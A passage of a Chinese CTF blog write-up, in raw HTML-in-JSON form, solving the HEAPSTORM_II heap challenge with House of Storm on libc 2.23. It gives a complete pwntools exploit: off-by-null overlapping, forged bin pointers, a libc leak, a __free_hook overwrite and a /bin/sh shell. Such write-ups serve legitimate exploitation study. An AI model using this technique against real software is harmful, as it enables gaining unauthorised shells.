class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;./pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class=\"line\">p=process(filename)</span><br><span class=\"line\"><span class=\"comment\">#p=remote()</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Command: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;1&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Size: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">idx,content</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Command: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;2&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Size: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(payload)))</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Content: &#x27;</span>)</span><br><span class=\"line\">  s(<span class=\"built_in\">str</span>(content))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Command: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;3&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">idx</span>):</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Command: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"string\">&#x27;4&#x27;</span>)</span><br><span class=\"line\">  ru(<span class=\"string\">&#x27;Index: &#x27;</span>)</span><br><span class=\"line\">  sl(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x508</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x508</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#6</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x4f0</span>+p64(<span class=\"number\">0x500</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)<span class=\"comment\">#edit the pre_size of fake chunk </span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#reset the pre_inuse and pre_size of chunk2</span></span><br><span class=\"line\"><span class=\"comment\">#reset the size of chunk1 by null of byte</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x18</span>-<span class=\"number\">12</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#malloc 0x500</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x4d8</span>)<span class=\"comment\">#7</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\">#the pre_size of chunk2 is 0x510 ,pre_inuse is 0 so chunk 2 will merge with chunk1(chunk2-pre_size==chunk1)</span></span><br><span class=\"line\"><span class=\"comment\">#now we achieve chunk overlapping</span></span><br><span class=\"line\"><span class=\"comment\">#chunk7-&gt;heap_base+0x50 can control 0x4d8</span></span><br><span class=\"line\"><span class=\"comment\">#now we use malloc to get the chunk</span></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x4e8</span>)<span class=\"comment\">#2 can be control by chunk7(chunk7-&gt;chunk2-0x10)</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#do again by chunk4</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x4f0</span>+p64(<span class=\"number\">0x500</span>)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,payload)<span class=\"comment\">#edit the pre_size of fake chunk </span></span><br><span class=\"line\">free(<span class=\"number\">4</span>)<span class=\"comment\">#reset the pre_inuse and pre_size of chunk2</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x18</span>-<span class=\"number\">12</span>)</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,payload)</span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x4d8</span>)<span class=\"comment\">#8</span></span><br><span class=\"line\"><span class=\"comment\">#chunk8-&gt;heap_base+0x5a0 can control 0x4d8</span></span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\">free(<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>)<span class=\"comment\">#4 make a smaller chunk</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x4e8</span>)<span class=\"comment\">#2 put the smaller chunk into large bin(size=0x4e1) control by chunk8</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\">#put the bigger chunk into unsorted bin(size=0x4f1) controlled by chunk7</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#reset the bk of unsorted bin chunk, bk and bk_nextsize of large bin chunk</span></span><br><span class=\"line\">fake=<span class=\"number\">0x13370800</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x4f1</span>)+p64(<span class=\"number\">0</span>)+p64(fake)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,payload)<span class=\"comment\">#unsort bin chunk&#x27;s bk</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x4e1</span>)+p64(<span class=\"number\">0</span>)+p64(fake+<span class=\"number\">0x8</span>)+p64(<span class=\"number\">0</span>)+p64(fake-<span class=\"number\">0x18</span>-<span class=\"number\">0x5</span>)</span><br><span class=\"line\">edit(<span class=\"number\">8</span>,payload)<span class=\"comment\">#large bin chunk&#x27;s bk and bk_nextsize</span></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>)<span class=\"comment\">#2 malloc 0x13370800</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#reset r1~r4 and leak libc</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x13377331</span>)+p64(<span class=\"number\">0x13370800</span>)+p64(<span class=\"number\">0x70</span>)<span class=\"comment\">#reset chunk0=&gt;heaparray</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,payload)<span class=\"comment\">#get show</span></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;]: &quot;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;HEAPSTORM_II&#x27;</span>)</span><br><span class=\"line\">libcbase=(uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:])^<span class=\"number\">0x13370800</span>)-<span class=\"number\">0x68</span>-<span class=\"number\">0x3c4b10</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#overwrite free_hook to get shell</span></span><br><span class=\"line\">free_hook=libcbase+libc.sym[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">sys_addr=libcbase+libc.sym [<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">leak(<span class=\"string\">&quot;free_hook&quot;</span>,<span class=\"built_in\">hex</span>(free_hook))</span><br><span class=\"line\">leak(<span class=\"string\">&quot;system&quot;</span>,<span class=\"built_in\">hex</span>(sys_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x13377331</span>)+p64(<span class=\"number\">0x13370800</span>)+p64(<span class=\"number\">0x70</span>)+p64(free_hook)+p64(<span class=\"number\">0x50</span>)+p64(<span class=\"number\">0x13370850</span>)+p64(<span class=\"number\">0x50</span>)+<span class=\"string\">&quot;/bin/sh\\x00&quot;</span></span><br><span class=\"line\"><span class=\"comment\">#reset chunk1=&gt;free_hook chunk2=&gt;&quot;/bin/sh&quot;</span></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)</span><br><span class=\"line\"><span class=\"comment\">#debug()</span></span><br><span class=\"line\">payload=p64(sys_addr)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"<p>House of Storm例题</p>","more":"<p>64位堆题，保护全开，libc 2.23。</p>\n<p>一个菜单，有增删查改功能。</p>\n<p>程序开始时会禁用，初始化heap_array。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">heapchunk</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> size ^ r1;</span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> chunk ^ r2;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">heaparray</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    <span class=\"type\">unsigned</span> <span class=\"type\">long</span> r1,r2,r3,r4;<span class=\"comment\">//四个随机数，其中r3==r4</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">heapchunk</span> <span class=\"title\">heap_chunk</span>[16];</span></span><br><span class=\"line\">&#125; heap_array;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>add功能中最多同时存在16个chunk并且会使用calloc，对chunk中内容清空。</p>\n<p>delete功能中会检测idx和size是否正确，free后会清空指针和size。</p>\n<p>edit功能中存在off by one漏洞。写入数据大小必须<strong>小于size-0x12</strong>，并且会在写入的content后面加上一个12字节的字符串，同时会**多写一个’\\x00’**。因此这里直接利用edit控制pre_size是不可行的。</p>\n<p>show功能开始的时候会对heaparray的r3和r4进行xor，只有结果<code>==0x13377331</code>才能show，然而``r3==r4`，xor的结果会是0。这让我们能够<strong>控制heaparray才能show</strong>。</p>\n<p>首先我们通过off by null减小size，再利用前向合并(unlink)来实现overlapping，控制两个chunk用于house of storm。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#0</span></span><br><span class=\"line\">add(<span class=\"number\">0x508</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#2</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#3</span></span><br><span class=\"line\">add(<span class=\"number\">0x508</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#5</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#6</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x4f0</span>+p64(<span class=\"number\">0x500</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>,payload)<span class=\"comment\">#首先在chunk1+0x4f0写入0x500，作为之后的pre_size</span></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#释放chunk1，这会写入chunk2的pre_size(0x510)和pre_inuse(0)</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x18</span>-<span class=\"number\">12</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,payload)<span class=\"comment\">#通过off by null修改chunk1的size(0x511=&gt;0x500)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#这里将0x500的内容申请出来，chunk7后面用来overlapping</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x4d8</span>)<span class=\"comment\">#7</span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">1</span>)<span class=\"comment\">#绕过unlink的检查（合并的时候会用unlink去取chunk）</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\">#释放chunk2后，由于pre_inuse==0会进行前向合并，根据pre_size(0x510)找到前一个chunk进行合并(合并了之前chunk1的0x510)</span></span><br><span class=\"line\"><span class=\"comment\">#由此实现overlapping，chunk7-&gt;heapbase+0x50，能写入0x4d8(实际上只要能控制前0x20即可)</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x38</span>)<span class=\"comment\">#1</span></span><br><span class=\"line\">add(<span class=\"number\">0x4e8</span>)<span class=\"comment\">#2 overlapping，可以被chunk7控制，size为0x4f0</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#故技重施</span></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x4f0</span>+p64(<span class=\"number\">0x500</span>)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,payload)<span class=\"comment\">#在chunk4+0x4f0写入0x500，作为之后的pre_size</span></span><br><span class=\"line\">free(<span class=\"number\">4</span>)<span class=\"comment\">#释放chunk4，这会写入chunk5的pre_size(0x510)和pre_inuse(0)</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">&#x27;a&#x27;</span>*(<span class=\"number\">0x18</span>-<span class=\"number\">12</span>)</span><br><span class=\"line\">edit(<span class=\"number\">3</span>,payload)<span class=\"comment\">#通过off by null修改chunk4的size(0x511=&gt;0x500)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#这里将0x500的内容申请出来，chunk8后面用来overlapping</span></span><br><span class=\"line\">add(<span class=\"number\">0x18</span>)<span class=\"comment\">#4</span></span><br><span class=\"line\">add(<span class=\"number\">0x4d8</span>)<span class=\"comment\">#8 </span></span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">4</span>)<span class=\"comment\">#绕过unlink的检查（合并的时候会用unlink去取chunk）</span></span><br><span class=\"line\">free(<span class=\"number\">5</span>)<span class=\"comment\">#释放chunk5后，由于pre_inuse==0会进行前向合并，根据pre_size(0x510)找到前一个chunk进行合并(合并了之前chunk4的0x510)</span></span><br><span class=\"line\"><span class=\"comment\">#由此实现overlapping，chunk8-&gt;heapbase+0x5a0，能写入0x4d8</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>)<span class=\"comment\">#4 从unsorted bin中切割，余下0x4e0大小的chunk(被chunk8控制)在unsorted bin中</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\">#将chunk7控制的chunk(0x4f0)放入unsorted bin</span></span><br><span class=\"line\">add(<span class=\"number\">0x4e8</span>)<span class=\"comment\">#2 由于unsorted bin先进先出的机制，因此0x4e0的chunk首先被考虑，由于大小不足，被放入large bin。0x4f0的chunk由于大小恰好被分配出来。</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)<span class=\"comment\">#把chunk7控制的chunk(0x4f0)释放，放入unsorted bin</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#至此，可以用chunk7控制一个unsorted bin chunk(0x4f0)，用chunk8控制一个large bin chunk(0x4e0)</span></span><br><span class=\"line\"><span class=\"comment\">#并且unsorted bin chunk size &gt;large bin chunk size ,并且均在一个large bin范围内</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#chunk7-&gt;unsorted bin chunk-0x10</span></span><br><span class=\"line\"><span class=\"comment\">#chunk8-&gt;large bin chunk-0x20</span></span><br></pre></td></tr></table></figure>\n\n<p>之后就可以进行House of Storm了，需要构造一下内容：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">unsorted_bin_chunk-&gt;bk=fake_chunk</span><br><span class=\"line\">large_bin_chunk-&gt;bk=fake_chunk+<span class=\"number\">0x8</span></span><br><span class=\"line\">large_bin_chunk-&gt;bk_nextsize=fake_chunk<span class=\"number\">-0x18</span><span class=\"number\">-5</span></span><br></pre></td></tr></table></figure>\n\n<p>这里的fake chunk自然就是0x13370800-0x10。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#修改unsorted bin chunk的bk,large bin chunk的bk和bk_nextsize</span></span><br><span class=\"line\">fake=<span class=\"number\">0x13370800</span>-<span class=\"number\">0x10</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">2</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x4f1</span>)+p64(<span class=\"number\">0</span>)+p64(fake)</span><br><span class=\"line\">edit(<span class=\"number\">7</span>,payload)<span class=\"comment\">#unsort bin chunk&#x27;s bk</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">4</span>+p64(<span class=\"number\">0</span>)+p64(<span class=\"number\">0x4e1</span>)+p64(<span class=\"number\">0</span>)+p64(fake+<span class=\"number\">0x8</span>)+p64(<span class=\"number\">0</span>)+p64(fake-<span class=\"number\">0x18</span>-<span class=\"number\">0x5</span>)</span><br><span class=\"line\">edit(<span class=\"number\">8</span>,payload)<span class=\"comment\">#large bin chunk&#x27;s bk and bk_nextsize</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#如果运气好，堆地址的高位是0x56，则能绕过检测malloc成功</span></span><br><span class=\"line\">add(<span class=\"number\">0x48</span>)<span class=\"comment\">#2 malloc 0x13370800 House of Storm</span></span><br></pre></td></tr></table></figure>\n\n<p>申请到0x13370800之后，就可以修改r3和r4获得show来leak libcbase，之后也可以修改r1、r2和堆指针获得任意写。</p>\n<p>因为malloc后才加密，而在malloc之后，仍会保存其fd和bk（不知道为什么没有被calloc清空），之后chunk_addr^fd再写入heaparray中。此时fd-&gt;unsorted bin，因此heaparray+0x40^chunk_addr可以得到fd，由此可以leak libcbase。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#reset r1~r4 and leak libc</span></span><br><span class=\"line\">payload=p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x13377331</span>)+p64(<span class=\"number\">0x13370800</span>)+p64(<span class=\"number\">0x70</span>)<span class=\"comment\">#reset chunk0=&gt;heaparray</span></span><br><span class=\"line\">edit(<span class=\"number\">2</span>,payload)<span class=\"comment\">#get show</span></span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;]: &quot;</span>)</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;HEAPSTORM_II&#x27;</span>)</span><br><span class=\"line\">libcbase=(uu64(ru(<span class=\"string\">&#x27;\\x7f&#x27;</span>)[-<span class=\"number\">6</span>:])^<span class=\"number\">0x13370800</span>)-<span class=\"number\">0x68</span>-<span class=\"number\">0x3c4b10</span></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase&#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br></pre></td></tr></table></figure>\n\n<p>最后修改__free_hook为system函数，执行system(“/bin/sh\\x00”)。</p>\n<p>总的exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span 